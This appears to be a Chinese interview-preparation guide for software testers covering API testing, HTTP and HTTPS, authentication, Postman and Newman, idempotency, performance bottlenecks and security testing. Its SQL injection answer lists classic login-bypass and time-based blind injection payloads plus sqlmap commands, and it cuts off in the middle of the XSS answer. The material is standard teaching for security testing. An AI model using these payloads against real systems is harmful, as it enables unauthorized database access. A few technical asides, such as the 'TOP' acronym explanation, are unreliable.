### Q1：什么是接口测试？为什么要做接口测试？

**题目类别**：接口测试
**难度**：初级
**出现频率**：极高

**考点分析**
接口测试是现代测试的基础技能，考察对其价值和定位的理解。

**参考答案**

接口测试（API Testing）是对系统组件之间通信接口的测试，主要验证数据交换、传递和交互的正确性。在现代软件架构中，接口测试通常指HTTP/HTTPS接口（RESTful API、GraphQL等）的测试。

**为什么要做接口测试**：

1. **分层测试的中间层**：接口测试位于单元测试之上、UI测试之下，是测试金字塔的中间层，投入产出比最高

2. **核心逻辑验证**：大部分业务逻辑在服务端通过接口实现，UI只是展示层。接口测试能直击业务核心

3. **早于UI介入**：接口开发完成即可测试，不需要等前端UI开发完成，实现测试左移

4. **执行效率高**：接口测试毫秒至秒级完成，远快于UI测试（秒至分钟级）

5. **真实覆盖**：单元测试大量使用Mock，而接口测试接近真实交互，能发现集成问题

6. **稳定性好**：接口不随UI变化而变化，UI改版频繁但接口相对稳定

7. **易于自动化**：接口测试天然适合自动化，是CI/CD的关键环节

**加分项 / 深度展开**

- 用测试金字塔说明：接口测试是"性价比最高"的测试类型
- 举例：一个电商系统，手工UI回归一轮需要3天，而接口自动化回归只需30分钟，且接口测试覆盖了90%的业务逻辑
- 提到接口测试的常见误区：把接口测试等同于"跑一遍正向流程"，实际上接口测试需要覆盖参数组合、异常处理、鉴权验证等丰富场景

### Q2：RESTful API的设计原则有哪些？请列举并说明。

**题目类别**：接口测试
**难度**：中级
**出现频率**：高

**考点分析**
考察对接口协议和规范的理解，这是接口测试的基础。

**参考答案**

REST（Representational State Transfer）是目前最主流的API设计风格，核心原则如下：

1. **资源导向（Resource-Oriented）**
   - 一切皆资源（URI表示资源，不是动作）
   - 正确：`GET /users/123`
   - 错误：`GET /getUser?id=123`

2. **使用标准HTTP方法（统一接口）**
   | HTTP方法 | 操作 | 幂等性 | 举例 |
   |---------|------|--------|------|
   | GET | 获取资源 | 是 | `GET /users/123` |
   | POST | 创建资源 | 否 | `POST /users` |
   | PUT | 全量更新资源 | 是 | `PUT /users/123` |
   | PATCH | 部分更新资源 | 否 | `PATCH /users/123` |
   | DELETE | 删除资源 | 是 | `DELETE /users/123` |

3. **无状态（Stateless）**
   - 服务端不保存客户端状态，每个请求都是独立的
   - 所有必要信息包含在请求中（Token、参数等）

4. **资源的多种表现形式（Representation）**
   - 同一资源可以有不同表示（JSON、XML）
   - 通过Accept头指定：`Accept: application/json`

5. **使用标准HTTP状态码**
   - 2xx：成功（200 OK, 201 Created, 204 No Content）
   - 3xx：重定向
   - 4xx：客户端错误（400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found）
   - 5xx：服务端错误（500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable）

6. **HATEOAS（超媒体即应用状态引擎）**
   - 响应中包含相关操作的链接
   - 例：订单响应中包含"支付"、"取消"的链接

**加分项 / 深度展开**

- 提到Richardson成熟度模型（RESTful API的4个成熟度级别）
- 提到REST vs GraphQL vs gRPC的选型：REST适合CRUD资源型，GraphQL适合前端需要灵活数据的场景，gRPC适合微服务间高性能通信
- 举例：测试一个"非RESTful"的接口时发现的典型问题——所有操作都用GET（包括删除），导致搜索引擎爬虫删除了数据

### Q3：HTTP和HTTPS的区别是什么？HTTPS的加密过程是怎样的？

**题目类别**：接口测试
**难度**：中级
**出现频率**：高

**考点分析**
考察网络协议基础，对于接口测试和安全测试都很重要。

**参考答案**

| 对比维度 | HTTP | HTTPS |
|----------|------|-------|
| 全称 | HyperText Transfer Protocol | HTTP over SSL/TLS |
| 默认端口 | 80 | 443 |
| 数据加密 | 明文传输（不安全） | SSL/TLS加密传输 |
| 证书要求 | 不需要 | 需要CA颁发的SSL证书 |
| 速度 | 较快（无加密开销） | 稍慢（SSL握手开销） |
| SEO | 无优势 | 搜索引擎优先收录 |
| URL前缀 | http:// | https:// |

**HTTPS的加密过程（TLS握手简化版）**：

```
客户端(浏览器)                              服务端(Web服务器)
    |                                           |
    |--- 1. Client Hello -------------------- ->|  (支持的加密套件+随机数1)
    |                                           |
    |<- 2. Server Hello + 证书 ----------------|  (选定加密套件+随机数2+证书含公钥)
    |                                           |
    |--- 3. 验证证书 ---------------------------|  (CA机构验证)
    |--- 4. 生成Pre-Master Secret -------------|  (用公钥加密后发送)
    |--- 5. 发送加密的Pre-Master Secret ------->|
    |                                           |
    |          双方用 随机数1+随机数2+Pre-Master Secret
    |          生成对称会话秘钥（Session Key）
    |                                           |
    |<-- 6. 对称加密通信 ---------------------->|  (后续都用Session Key)
```

HTTPS = HTTP + SSL/TLS，核心是：
- 非对称加密（RSA/ECDHE）用于握手阶段的密钥交换和身份认证
- 对称加密（AES）用于后续数据通信（效率高）

**加分项 / 深度展开**

- 提到SSL/TLS版本差异：TLS 1.2 vs TLS 1.3（握手更快、更安全）
- 提到抓包工具的原理：Charles/Fiddler的HTTPS抓包是中间人攻击（MITM），需要在设备上安装自己的根证书
- 举例：测试时发现APP在HTTPS通信中开启了"信任所有证书"的选项（开发方便调试），这在生产环境是严重的安全漏洞

### Q4：HTTP状态码有哪些？请分类说明并举例接口测试中的应用。

**题目类别**：接口测试
**难度**：初级
**出现频率**：极高

**考点分析**
最基础但最高频的接口测试知识，必须能熟练说出各类状态码及其含义。

**参考答案**

**HTTP状态码分类**：

| 类别 | 范围 | 含义 | 接口测试中的典型场景 |
|------|------|------|-------------------|
| 1xx | 100-199 | 信息响应 | 很少出现 |
| 2xx | 200-299 | 成功 | 期望的正向结果 |
| 3xx | 300-399 | 重定向 | 权限问题、登录态过期后的跳转 |
| 4xx | 400-499 | 客户端错误 | 参数校验、权限验证 |
| 5xx | 500-599 | 服务端错误 | 服务故障、异常 |

**接口测试中最重要的状态码详解**：

| 状态码 | 含义 | 测试时如何构造 | 接口测试关注点 |
|--------|------|---------------|-------------|
| **200 OK** | 请求成功 | 正确的请求参数 | 验证响应体内容和格式 |
| **201 Created** | 创建成功 | POST创建新资源 | 验证返回了资源ID和Location头 |
| **204 No Content** | 成功但无返回内容 | DELETE删除 | 验证返回体确实为空 |
| **400 Bad Request** | 请求参数错误 | 参数缺失/格式错误/类型不对 | 验证错误消息是否友好、安全|
| **401 Unauthorized** | 未认证 | 不带Token/Token过期 | 验证是否需要登录 |
| **403 Forbidden** | 已认证但无权访问 | 用低权限账号访问高权限接口 | 验证权限粒度 |
| **404 Not Found** | 资源不存在 | 传入不存在的资源ID | 验证返回体与业务一致 |
| **405 Method Not Allowed** | 方法不允许 | 用POST访问GET接口 | 验证方法校验 |
| **409 Conflict** | 资源冲突 | 重复创建已有资源 | 幂等性验证 |
| **429 Too Many Requests** | 请求频率超限 | 短时间内大量请求 | 验证限流策略 |
| **500 Internal Server Error** | 服务内部错误 | 制造异常数据/边界值 | 必须记录日志，不能暴露堆栈 |
| **502 Bad Gateway** | 网关错误 | 下游服务不可用 | 验证降级策略 |
| **503 Service Unavailable** | 服务不可用 | 服务宕机 | 验证熔断和重试机制 |

**加分项 / 深度展开**

- 面试测试场景：给一个具体接口，问"这个接口在哪些情况下应该返回4xx？哪些情况下返回5xx？"
- 提到"状态码使用不当"的常见反例：业务错误也返回200（但body中有错误信息），这违反了HTTP语义
- 举例：测试发现一个场景——用正确Token访问他人的订单详情，接口返回500而不是403，说明服务端没有做数据权限校验，抛了空指针异常。这是一个权限漏洞，而不是简单的技术Bug

### Q5：Cookie、Session、Token的区别是什么？如何在接口测试中处理身份认证？

**题目类别**：接口测试
**难度**：中高
**出现频率**：高

**考点分析**
鉴权是接口测试的核心难点之一，考察实际动手能力。

**参考答案**

**Cookie、Session、Token三者对比**：

| 维度 | Cookie | Session | Token（JWT） |
|------|--------|---------|------------|
| **存储位置** | 浏览器（客户端） | 服务端（内存/Redis/DB） | 客户端（LocalStorage/Cookie） |
| **安全性** | 低（可被篡改/盗用） | 中（Session ID暴露则危险） | 高（签名防篡改） |
| **服务器开销** | 无 | 有（需维护Session存储） | 无（无状态验证） |
| **跨域支持** | 受同源策略限制 | 需处理跨域 | 天然支持跨域 |
| **扩展性** | 受限（跨服务器需共享Cookie） | 受限于Session存储 | 好（无状态，任何服务器可验证） |
| **适用场景** | 传统Web应用 | 传统Web应用 | SPA、移动APP、微服务 |

**身份认证机制的工作流程**：

**Session-Cookie模式**：
```
1. 用户登录 -> 服务端创建Session（存储在服务端） -> 返回Session ID给浏览器
2. 浏览器将Session ID存入Cookie
3. 后续请求自动携带Cookie -> 服务端根据Session ID查找Session
```

**Token模式（JWT）**：
```
1. 用户登录 -> 服务端验证通过 -> 生成JWT Token返回
2. 客户端存储Token -> 后续请求在Header中携带Token
   Authorization: Bearer <token>
3. 服务端验证Token签名和有效期
```

**接口测试中的鉴权处理（以Postman为例）**：

```javascript
// 1. 在Pre-request Script中自动获取Token
const loginRequest = {
    url: pm.environment.get("baseUrl") + "/api/login",
    method: 'POST',
    header: {'Content-Type': 'application/json'},
    body: {
        mode: 'raw',
        raw: JSON.stringify({
            username: pm.environment.get("username"),
            password: pm.environment.get("password")
        })
    }
};

pm.sendRequest(loginRequest, (err, res) => {
    if (!err) {
        const token = res.json().data.token;
        pm.environment.set("authToken", token);
        console.log("Token获取成功:", token);
    }
});

// 2. Collection级别设置公共Header
// Authorization: Bearer {{authToken}}
```

**加分项 / 深度展开**

- 提到JWT的三个部分：Header.Payload.Signature，以及每部分的作用
- 提到JWT的安全注意事项：不要在Payload中放敏感信息（Base64编码可直接解码）、设置合理的过期时间、使用Refresh Token轮换
- 提到OAuth2.0的四种授权模式：授权码模式（最安全）、隐式模式、密码模式、客户端凭证模式
- 举例：测试时发现Token过期后接口仍返回200（但返回了空数据），这是权限校验不严格的Bug，正确做法是返回401

### Q6：Postman如何实现自动化接口测试？Collection Runner和Newman是什么？

**题目类别**：接口测试工具
**难度**：中级
**出现频率**：高

**考点分析**
Postman是最主流的接口测试工具，考察工具深度使用能力。

**参考答案**

**Postman自动化测试的核心能力**：

1. **Pre-request Script（请求前脚本）**
   - 动态生成请求参数（签名计算、时间戳）
   - 自动获取Token
   - 从环境变量读取配置

2. **Tests（测试断言脚本）**
```javascript
// 状态码断言
pm.test("状态码应该是200", () => {
    pm.response.to.have.status(200);
});

// 响应时间断言
pm.test("响应时间应在1秒以内", () => {
    pm.expect(pm.response.responseTime).to.be.below(1000);
});

// JSON响应体断言
pm.test("返回的data数组不应为空", () => {
    const jsonData = pm.response.json();
    pm.expect(jsonData.data).to.be.an("array").that.is.not.empty;
});

// JSON Schema验证
pm.test("响应结构符合预期", () => {
    const schema = {
        type: "object",
        required: ["code", "message", "data"],
        properties: {
            code: { type: "integer" },
            message: { type: "string" },
            data: { type: "object" }
        }
    };
    pm.response.to.have.jsonSchema(schema);
});

// 链式调用：从响应中提取数据用于下一个请求
pm.test("提取userId给后续请求使用", () => {
    const userId = pm.response.json().data.id;
    pm.environment.set("userId", userId);
});
```

3. **变量作用域**
   - Global（全局）- 跨Collection
   - Collection（集合）- 当前Collection内
   - Environment（环境）- 当前环境（开发/测试/预发布/生产）
   - Data（数据）- CSV/JSON数据文件驱动
   - Local（本地）- 单个请求

```
作用域优先级（从小到大）：Data < Local < Environment < Collection < Global
即Global优先级最低，Data优先级最高
```

4. **Collection Runner**
   - 批量执行Collection中的请求
   - 支持数据驱动（CSV/JSON文件）
   - 设置迭代次数和延迟
   - 生成运行报告

5. **Newman（命令行运行器）**
```bash
# 安装
npm install -g newman

# 运行Collection
newman run collection.json -e environment.json

# 带数据驱动的运行
newman run collection.json -d testdata.csv --iteration-count 100

# 生成HTML报告
newman run collection.json -r htmlextra

# 集成到CI/CD (以Jenkins为例)
# shell脚本调用newman后，通过exit code判断成功/失败
```

**加分项 / 深度展开**

- 提到Postman Monitors：定时监控接口的可用性和性能（测试右移）
- 提到Mock Server功能：根据Collection自动生成Mock接口
- 举例：我做了一套200+个接口的自动化回归测试，通过Newman在Jenkins中每天凌晨自动执行，失败的接口自动告警到企业微信。维护1年，累计主动发现了40+个接口变更导致的兼容性问题

### Q7：接口测试用例应该覆盖哪些方面？请系统性地梳理。

**题目类别**：接口测试设计
**难度**：中高
**出现频率**：高

**考点分析**
考察接口测试的系统性思维，不只是"测一下通不通"。

**参考答案**

**接口测试用例设计维度**：

**一、功能正确性**

| 覆盖维度 | 测试点 | 举例 |
|---------|--------|------|
| **必填参数校验** | 每个必填参数缺失时返回错误 | username缺失 -> 400 |
| **参数类型校验** | 参数类型不匹配 | age传字符串"abc" -> 400 |
| **参数长度校验** | 超长/为空 | name传1000字符 -> 400 |
| **参数格式校验** | 手机号/邮箱/身份证格式 | phone格式不对 -> 400 |
| **参数范围校验** | 超过有效范围 | pageSize=0/-1/10000 |
| **参数组合校验** | 互斥/依赖/条件组合 | 方式A和方式B不能同时填 |
| **重复参数** | 同一个参数传多次 | id=1&id=2的处理 |

**二、边界值**

| 覆盖维度 | 测试点 |
|---------|--------|
| **数值边界** | 最小值、最大值、最小值-1、最大值+1 |
| **集合边界** | 空数组、单元素、最大长度、最大长度+1 |
| **时间边界** | 跨天/跨月/跨年的临界值 |
| **金额边界** | 0.00、0.01、非常大、负数、精度 |

**三、业务逻辑**

| 覆盖维度 | 测试点 |
|---------|--------|
| **状态约束** | 不同状态下允许的操作（如：已支付的订单不能取消）|
| **数据一致性** | 操作前后的数据变化（库存扣减、余额变动）|
| **幂等性** | 重复请求的结果是否一致 |
| **并发** | 并发同一接口的行为（是否有竞态条件）|
| **业务规则** | 满减/阶梯价格/权限等级等 |

**四、鉴权和权限**

| 覆盖维度 | 测试点 |
|---------|--------|
| **无Token** | 不带Token -> 401 |
| **错误Token** | 伪造/过期/格式错误 -> 401 |
| **低权限Token** | 普通用户访问管理员接口 -> 403 |
| **跨用户数据访问** | 用户A访问用户B的数据 -> 403 |
| **Token刷新** | 使用RefreshToken正常续期 |

**五、异常和安全性**

| 覆盖维度 | 测试点 |
|---------|--------|
| **特殊字符** | SQL注入字符、XSS脚本、Emoji、  |
| **超大数据** | 超大请求体、超大文件 |
| **编码问题** | UTF-8/GBK编码的兼容性 |
| **HTTP方法覆盖** | 用不支持的HTTP方法请求接口 |
| **Content-Type** | 错误/缺失的Content-Type |

**六、性能和可靠性**

| 覆盖维度 | 测试点 |
|---------|--------|
| **响应时间** | 正常负载下的RT |
| **并发** | 并发请求的正确性 |
| **限流** | 超过频率限制 -> 429 |
| **超时处理** | 请求超时后客户端的处理 |
| **重试机制** | 失败后重试是否安全（幂等性）|

**七、数据验证（灰盒）**

| 覆盖维度 | 测试点 |
|---------|--------|
| **数据库落库** | 验证关键数据是否正确写入 |
| **缓存一致性** | Redis数据与DB数据是否一致 |
| **消息队列** | 消息是否正确发送和消费 |

**加分项 / 深度展开**

- 用思维导图(MindMap)展示接口测试用例设计全景

### Q8：GET请求和POST请求的区别？在接口测试中如何选择？

**题目类别**：接口测试
**难度**：初级
**出现频率**：极高

**考点分析**
基础中的基础，但很多人的回答停留在表面。

**参考答案**

| 对比维度 | GET | POST |
|----------|-----|------|
| **语义** | 获取资源 | 创建资源 |
| **参数位置** | URL查询字符串（Query String） | 请求体（Request Body） |
| **参数长度限制** | 受URL长度限制（浏览器约2KB，服务端可配置） | 无严格限制（服务端可配置请求体大小） |
| **安全性** | 参数暴露在URL，更不安全 | 参数在Body中，相对安全（但也需HTTPS） |
| **幂等性** | 天然幂等（多次请求结果一致） | 非幂等（多次POST可能创建多个资源） |
| **缓存** | 可以被缓存 | 默认不被缓存 |
| **书签/分享** | 可收藏、可分享 | 不可 |
| **Restful语义** | 获取（Read） | 创建（Create） |

**接口测试中的选择指导**：

1. **获取数据** -> GET
2. **创建数据** -> POST
3. **登录** -> POST（原因：密码不应在URL中出现、有副作用）
4. **搜索** -> GET（利于缓存和分享）
5. **上传文件** -> POST（请求体大）
6. **更新数据** -> PUT/PATCH
7. **删除数据** -> DELETE

**加分项 / 深度展开**

- 提到GET也支持Body传参（HTTP规范不禁止，但实际极少使用，很多工具/框架不支持）
- 提到POST也能在URL传参（但不推荐）
- 提到"GET请求应该只用来读取数据，不应该修改服务端数据"这一重要原则。如果GET请求删除了数据（违反语义），搜索引擎的爬虫可能会无意中删除数据
- 举例：测试发现一个使用了GET方法来"取消订单"的接口，且无任何权限校验，只需知道订单号就能取消任何人的订单。推动改为POST+Token校验

### Q9：什么是接口幂等性？如何测试接口的幂等性？

**题目类别**：接口测试
**难度**：中高
**出现频率**：中高

**考点分析**
幂等性是接口设计中的重要概念，特别是在支付/金融领域至关重要。

**参考答案**

幂等性（Idempotence）是指对同一个接口的多次相同请求，产生的效果与单次请求相同，即重复请求不会产生额外的副作用。

**为什么幂等性重要**：
- 网络不可靠：客户端超时后重试，服务端可能执行了多次
- 用户操作：用户多次点击提交按钮
- 消息重复消费：消息队列可能投递多次
- 分布式系统的天然挑战

**天然幂等的HTTP方法**：
- GET：只读操作，天然幂等
- PUT：全量更新到指定状态，多次PUT结果一致
- DELETE：删除后再次删除仍是删除状态

**天然非幂等的HTTP方法**：
- POST：创建新资源，多次POST创建多个资源

**接口幂等性的实现方式**：

```java
// 方式1：唯一业务键 + 数据库唯一约束
// INSERT时使用唯一索引防止重复
@PostMapping("/orders")
public Result createOrder(@RequestBody CreateOrderRequest req) {
    String idempotentKey = req.getIdempotentKey(); // 客户端生成的唯一ID
    // 先查是否已处理过
    Order existing = orderRepo.findByIdempotentKey(idempotentKey);
    if (existing != null) {
        return Result.success(existing); // 返回已有结果
    }
    // 未处理过，创建订单
    Order order = orderService.create(req, idempotentKey);
    return Result.success(order);
}

// 方式2：Redis缓存 + 状态机
// 记录请求Key，已处理则返回缓存结果

// 方式3：数据库乐观锁
// UPDATE ... WHERE version = x
```

**幂等性测试方法**：

1. **重复请求测试**
   - 发送相同参数的请求N次（N>=2）
   - 验证效果只产生一次
   - 检查数据库记录数量、金额变动等

2. **并发测试**
   - 同时发起多个相同请求
   - 验证只有一次生效

3. **异常重试测试**
   - 第一次请求后模拟网络超时
   - 客户端重试后，验证不产生重复数据

4. **幂等性Key的防御测试**
   - 不带幂等Key -> 是否报错
   - 相同幂等Key但不同参数 -> 如何处理
   - 幂等Key过期后再用 -> 如何处理

**加分项 / 深度展开**

- 举例：在一次压测中发现了非幂等接口的Bug——由于HTTP超时客户端大量重试，结果创建了数千个重复订单。修复方式是为创建订单接口引入幂等Key机制。这个案例说明了幂等性不是"锦上添花"而是"刚需"
- 提到"幂等性要结合业务超时时间设计"：幂等Key的过期时间应该大于接口的超时时间
- 提到消息队列中消费端的幂等处理

### Q12：如何在接口测试中定位Bug？请描述你的排查思路。

**题目类别**：接口测试实践
**难度**：中高
**出现频率**：中高

**参考答案**

**接口Bug定位的系统化思路**：

**第1步：确认Bug现象，精确化信息**
- 精确记录：请求URL、方法、请求头、请求体、响应状态码、响应体
- 标记现象：期望什么 vs 实际是什么
- 记录环境信息：环境、版本、时间

**第2步：隔离变量**
- 同样请求在开发环境/测试环境表现是否一致？
- 不同账号/角色是否有差异？
- 相同参数换一个值是否也有问题？

**第3步：缩小范围**
| 如果... | 则可能... |
|---------|----------|
| 4xx错误 | 排查参数/鉴权/权限 |
| 5xx错误 | 查看后端日志（错误堆栈） |
| 返回数据不对 | 对比数据流：请求 -> 后端处理 -> 数据库 -> 返回 |
| 响应时间异常 | 排查SQL慢查询、下游服务调用、网络 |

**第4步：查看日志（灰盒定位）**
```bash
# 1. 查看应用日志
grep "ERROR" app.log | grep -A 10 "订单创建"

# 2. 查看慢SQL
SELECT * FROM mysql.slow_log WHERE query_time > 1;

# 3. 查看链路追踪（SkyWalking/Zipkin）
# 定位是哪个服务/方法耗时最长

# 4. 查看数据库数据
SELECT * FROM orders WHERE order_id = 'xxx';
```

**第5步：构造最小复现用例**
- 剥离无关信息，找到最小条件组合
- 方便开发快速复现和定位

**第6步：提交Bug时附带排查信息**
```
Bug报告附件：
1. 请求：curl命令（直接可执行）
2. 响应：完整JSON
3. 日志：相关错误日志
4. 数据库快照：关键数据状态
5. 我的初步判断（帮助开发快速定位）
```

**加分项 / 深度展开**

- 举例精确定位Bug的过程：接口返回500，看日志发现是NullPointerException -> 查看代码发现是某个字段没做null判断 -> 构造一个该字段为null的请求（之前测试只构造了正常数据）-> 确认可稳定复现。这个案例中，关键操作是"从日志中找到错误原因，再反向构造触发条件"
- 提到常用的定位工具和方法：Charles/Fiddler抓包、Postman Console、Kibana日志搜索、SkyWalking链路追踪

### Q16：什么是性能测试？性能测试的类型有哪些？

**出现频率**：高

性能测试是通过模拟一定负载条件来评估系统性能指标的活动。

**性能测试的主要类型**：

| 类型 | 英文 | 目的 | 场景 |
|------|------|------|------|

| **基准测试** | Benchmark Testing | 单用户单场景下的基线性能，作为对比参考 | 性能基线建立 |
| **配置测试** | Configuration Testing | 不同软件/硬件配置下的性能对比 | 配置调优 |
| **并发测试** | Concurrency Testing | 多用户同时操作时的行为正确性和性能 | 并发场景 |
| **可扩展性测试** | Scalability Testing | 扩展资源（如加节点）后性能是否线性增长 | 弹性架构验证 |

**加分项 / 深度展开**

- 举例：在电商项目中，负载测试验证了双11预期流量的3倍承载能力，压力测试找到了系统瓶颈（数据库连接池默认100不够），稳定性测试发现了24小时运行后内存从2G增长到6G（内存泄漏）

### Q17：TPS、QPS、并发数、响应时间之间的关系是什么？

**题目类别**：性能测试
**难度**：中级
**出现频率**：极高

**考点分析**
性能测试的四大基础指标，必须熟练掌握其含义和关系。

**参考答案**

**核心指标定义**：

| 指标 | 英文全称 | 定义 | 单位 |
|------|---------|------|------|
| **TPS** | Transactions Per Second | 每秒处理的事务数（一个事务包含多个请求，如一次下单包含选商品+下单+支付） | 笔/秒 |
| **QPS** | Queries Per Second | 每秒处理的查询请求数（单个请求） | 次/秒 |
| **并发数** | Concurrent Users / VU | 同时向系统发起请求的用户/线程数 | 个 |
| **响应时间** | Response Time (RT) | 从请求发起到收到完整响应的时间 | ms |
| **吞吐量** | Throughput | 单位时间内处理的数据量 | KB/s, MB/s |

**核心关系模型**：

```
并发数 = TPS * 平均响应时间
       = TPS * RT

即：TPS = 并发数 / RT
```

**直观理解**（以银行柜台类比）：
- 并发数 = 正在办理业务的窗口数
- 响应时间 = 每笔业务办理耗时
- TPS = 每秒能处理完多少笔业务
- 每个窗口每小时处理 3600/RT 笔业务（每笔RT秒）
- 总TPS = 并发窗口数 * (1000/RT)  = 并发数 / RT

**实际数据举例**：
```
场景1：并发数 = 100, RT = 200ms
  => TPS = 100 / 0.2s = 500 TPS

场景2：并发数 = 200, RT = 500ms
  => TPS = 200 / 0.5s = 400 TPS
  (并发翻倍，但RT恶化更多，TPS反而下降 - 系统已过最佳工作点)
```

**关键洞察**：
- 并发数增加 -> RT会上升（系统资源争抢）
- TPS先随并发增加而上升，达到拐点后开始下降或持平
- 最佳性能点：TPS最高时对应的并发数

**加分项 / 深度展开**

- 区分并发数和在线用户数：并发数 << 在线用户数，在线用户不一定同时发请求
- 提到使用率的经验值：CPU使用率超过80%通常意味着系统接近瓶颈
- 举例：双11秒杀场景中，业务预估并发数=10000，要求RT<500ms，那么TPS要求至少=10000/0.5=20000TPS。这就是性能测试的目标制定依据

### Q19：性能测试中如何定位系统瓶颈？请描述你的调优思路。

**题目类别**：性能定位
**难度**：高
**出现频率**：高

**考点分析**
考察性能问题的分析和调优能力，是高级性能测试的核心能力。

**参考答案**

**系统化性能瓶颈定位方法论**：

**第1步：看症状**
```
从JMeter报告中发现异常信号：
- TPS上不去（低于预期）→ 瓶颈
- RT突然飙升 → 拐点/瓶颈
- Error% > 0 → 服务过载或Bug
- 99% Line 远大于 Average → 长尾延迟
```

**第2步：逐层定位（自顶向下）**

```
用户端 → CDN → SLB/Nginx → 应用服务(Java/Go) → 缓存(Redis) → 数据库(MySQL) → 存储
              ↓                 ↓                ↓             ↓
         网络/负载均衡     代码/线程池/GC      缓存命中率    慢SQL/锁/连接数
```

逐层排查：
| 层级 | 看什么 | 工具 | 常见问题 |
|------|--------|------|---------|
| **网络** | 带宽、丢包率、延迟 | ping, iperf | 带宽不够、网络抖动 |
| **SLB/网关** | 并发连接数、QPS | Nginx status | 连接数上限、超时配置 |
| **应用层** | CPU, 内存, 线程, GC | top, arthas, jstack, jstat | Full GC频繁、线程池满、死锁 |
| **中间件** | 连接池, 线程池 | 中间件自带监控 | 连接池不够、队列积压 |
| **缓存** | 命中率、内存使用 | redis-cli info | 命中率低、缓存穿透/雪崩 |
| **数据库** | 慢SQL、锁等待、连接数 | show processlist, slowlog | 慢SQL、表锁/行锁、连接池不够 |
| **磁盘I/O** | IOPS, 读写延迟 | iostat, vmstat | 磁盘IO瓶颈 |

**第3步：使用APM工具快速定位**
```
SkyWalking / Pinpoint / Zipkin：
- 看整体QPS和RT曲线
- 看哪个服务/接口RT最高
- 展开看Trace详情：哪个Span(方法调用/DB查询/HTTP调用)耗时最长
-> 精准定位到方法级别或SQL级别
```

**第4步：常见问题与解决方案**

| 症状 | 可能原因 | 调优方向 |
|------|---------|---------|
| **应用CPU高，RT高** | 代码效率低、循环过多 | 优化算法、缓存计算结果 |
| **Full GC频繁** | 堆内存不足、内存泄漏 | 调大堆内存、分析Heap Dump找泄漏 |
| **数据库CPU高** | 慢SQL、缺少索引 | SQL优化、加索引、读写分离 |
| **获取连接超时** | 连接池太小 | 调大连接池、检查连接未释放 |
| **TPS到一定值后不再增长** | 线程数/连接数上限 | 调大Tomcat线程池、数据库连接池 |
| **RT突然飙升** | 达到某个资源天花板 | 扩容、限流、熔断 |
| **缓存命中率低** | 缓存策略不合理 | 优化缓存Key设计、预热 |
| **偶发的高RT** | Full GC、数据量大扫描 | 分页优化、索引优化 |

**第5步：调优闭环**
```
测试 -> 发现瓶颈 -> 分析根因 -> 调优 -> 回归测试 -> 对比验证 -> 记录最佳配置
```

**加分项 / 深度展开**

- 提到TOP分析方法论：Throughput-Oriented Programming —— 性能调优要基于数据而非直觉
- 举例一次完整的性能调优：电商下单接口压测TPS只有200，目标500。通过SkyWalking发现瓶颈在"扣减库存"的SQL（update语句锁等待），优化方向：1）Redis预扣库存减少数据库写压力 2）库存扣减异步化。最终TPS提升到800，超出了目标。关键心得：性能调优最怕"猜"，定位准了解决起来往往很快

### Q20：什么是内存泄漏？如何在性能测试中发现内存泄漏？

**题目类别**：性能测试
**难度**：中高
**出现频率**：中

**参考答案**

内存泄漏是指程序中已动态分配的堆内存由于某些原因未释放或无法释放，造成系统内存的浪费。

**性能测试中发现内存泄漏的方法**：

1. **长时间稳定性测试（必做）**
   - 在稳定负载下持续运行N小时（如24小时）
   - 观察内存是否持续增长（即使负载不变）

2. **监控工具观察**
   - JVM: `jstat -gcutil <pid> 1000` 观察老年代内存持续增长
   - Grafana+Prometheus: 内存使用曲线持续上升无下降

3. **GC日志分析**
   - Full GC后内存回收很少 -> 内存泄漏信号

4. **Heap Dump分析**
   - 压测前后分别采Heap Dump
   - MAT/JProfiler对比分析：哪些对象数量异常增长

**加分项 / 深度展开**

- 举例：项目中一次稳定性测试24小时后发现内存从2G涨到8G，Heap Dump分析后发现某个Map对象持续增长未清理。开发修复后重新测试，内存稳定在2.5G

### Q32：什么是SQL注入？如何测试SQL注入漏洞？

**题目类别**：安全测试
**难度**：中级
**出现频率**：极高

**考点分析**
SQL注入是最经典的安全漏洞，必须掌握其原理和测试方法。

**参考答案**

SQL注入是通过在输入域中插入恶意SQL语句，欺骗数据库执行非预期查询的攻击方式。

**攻击原理**：

正常SQL：
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '123456';
```

恶意输入：在用户名框输入 `admin' -- `（-- 是SQL注释）
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '123456';
-- 注释掉了密码验证部分: WHERE username = 'admin' -- 后面都被注释
-- 结果：不需要密码就能以admin身份登录！
```

另一个经典Payload：`' OR '1'='1`
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
-- '1'='1' 永远为真 -> 返回所有用户记录
```

**SQL注入测试方法**：

1. **手动测试**
   - 在输入框中输入：`' " ; -- # /* */`
   - 观察返回是否出现数据库错误
   - 输入：`' OR '1'='1` 看是否绕过逻辑
   - 输入：`' OR 1=1--` 测试基于数字的注入
   - 输入：`1' AND sleep(5)--` 时间盲注测试

2. **自动化工具**
   - sqlmap：最强大的SQL注入检测利用工具
   ```bash
   # 基本扫描
   sqlmap -u "http://example.com/page.php?id=1"
   # 指定参数测试
   sqlmap -u "http://example.com/api/login" --data="username=admin&password=123" --level=3
   ```

3. **Burp Suite + SQLMap联动**
   - Burp Suite抓包 -> 保存请求 -> sqlmap -r request.txt

**如何判断存在SQL注入**：
- 输入单引号后页面报数据库错误
- 输入`' OR '1'='1`后返回了意料之外的数据
- 输入睡眠指令后响应延迟明显

**防御方式**：
- 参数化查询（Prepared Statement）——最根本的防御
- ORM框架（但需注意原生SQL的使用）
- 输入验证和白名单
- 最小权限原则（数据库账户只给必要权限）

**加分项 / 深度展开**

- 区分SQL注入的三个子类型：经典注入（有回显）、报错注入（利用报错信息）、盲注（无回显，时间盲注/布尔盲注）
- 举例：测试一个搜索功能时，在搜索框输入`'`后页面返回了MySQL语法错误，确认了注入点。通过sqlmap进一步验证，发现可获取数据库中的用户信息，严重程度定为P0。最终开发改用PreparedStatement修复

### Q33：XSS攻击是什么？如何测试和防范？

**题目类别**：安全测试
**难度**：中级
**出现频率**：极高

**考点分析**
XSS是Web安全三大漏洞之一，必须掌握。

**参考答案**

XSS(Cross-Site Scripting)跨站脚本攻击是通过在页面中注入恶意脚本，当其他用户访问该页面时脚本执行的攻击方式。

**三种类型**：

| 类型 | 触发方式 | 危害等级 | 常见场景 |
|------|---------|---------|---------|
| **反射型XSS** | 用户点击含恶意脚本的URL | 中 | 搜索框、URL参数 |
